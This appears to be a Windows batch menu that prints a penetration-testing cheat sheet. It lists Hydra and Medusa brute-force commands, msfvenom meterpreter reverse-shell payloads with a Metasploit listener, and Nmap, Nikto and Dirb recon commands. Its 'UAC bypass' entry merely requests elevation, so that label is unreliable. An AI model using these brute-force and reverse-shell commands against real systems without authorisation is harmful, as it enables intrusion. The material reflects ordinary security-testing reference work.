@echo off
mode 80, 30
title Advanced Penetration Testing Toolkit
chcp 65001 >nul

:: Change to 'files' directory if it exists
if exist files cd files

:start
cls
echo.
echo.
echo [34m┌───────────────────────────────────────────────────────────────────┐[0m
echo [34m│ [96m██████╗ ███████╗███╗   ██╗████████╗███████╗██████╗ ███████╗ [34m│[0m
echo [34m│ [96m██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝ [34m│[0m
echo [34m│ [96m██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝█████╗    [34m│[0m
echo [34m│ [96m██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔═══╝ ██╔══╝    [34m│[0m
echo [34m│ [96m██║     ███████╗██║ ╚████║   ██║   ███████╗██║     ███████╗ [34m│[0m
echo [34m│ [96m╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ [34m│[0m
echo [34m└───────────────────────────────────────────────────────────────────┘[0m
echo.
echo [96m     Select an Option Below to Explore Tools and Techniques[0m
echo.
echo [92m  [1] Brute Force Tools[0m         - Tools for password cracking
echo [92m  [2] Simulate UAC Bypass[0m      - Demonstrates privilege escalation
echo [92m  [3] Payload Generator[0m       - Create test payloads using msfvenom
echo [92m  [4] Scanning & Recon[0m        - Tools for network and web reconnaissance
echo [92m  [5] Exit[0m
echo.

:: Wait for user input
choice /c 12345 /n /m "Enter your choice: "
set choice=%errorlevel%

:: Route user to the correct section
if %choice%==1 goto brute_force
if %choice%==2 goto uac_bypass
if %choice%==3 goto payload_gen
if %choice%==4 goto scanning
if %choice%==5 exit

:brute_force
cls
echo ============================================================
echo                     Brute Force Tools
echo ============================================================
echo Example tools for brute-forcing services like SSH, HTTP, or FTP:
echo.
echo [93m[+] Hydra[0m: Multi-protocol brute-force tool
echo    Command: hydra -l admin -P passwords.txt ssh://target_ip
echo.
echo [93m[+] Medusa[0m: High-performance brute-forcing tool
echo    Command: medusa -h target_ip -U users.txt -P passwords.txt -M ssh
echo.
echo Replace 'target_ip' with the actual IP and specify correct file paths.
pause
goto start

:uac_bypass
cls
echo ============================================================
echo                 Simulating UAC Bypass
echo ============================================================
echo Demonstration of privilege escalation using PowerShell:
echo.
echo Command: [93mpowershell -Command "Start-Process cmd -Verb runAs"[0m
echo.
echo This opens a new elevated command prompt. Use responsibly!
pause
goto start

:payload_gen
cls
echo ============================================================
echo                   Payload Generator
echo ============================================================
echo Generate payloads for testing using Metasploit's msfvenom:
echo.
echo [93m[+] Windows Reverse Shell[0m:
echo    msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > payload.exe
echo.
echo [93m[+] Linux Reverse Shell[0m:
echo    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f elf > payload.elf
echo.
echo Set up a listener in Metasploit with:
echo    use exploit/multi/handler
echo    set payload windows/meterpreter/reverse_tcp
echo    set LHOST your_ip
echo    set LPORT 4444
echo    exploit
pause
goto start

:scanning
cls
echo ============================================================
echo            Scanning and Reconnaissance Tools
echo ============================================================
echo Examples:
echo.
echo [93m[+] Nmap[0m: Network scanning tool
echo    Command: nmap -sC -sV -oN scan.txt target_ip
echo.
echo [93m[+] Nikto[0m: Web server vulnerability scanner
echo    Command: nikto -h http://target_ip
echo.
echo [93m[+] Dirb[0m: Directory brute-forcing tool
echo    Command: dirb http://target_ip /usr/share/wordlists/dirb/common.txt
echo.
pause
goto start
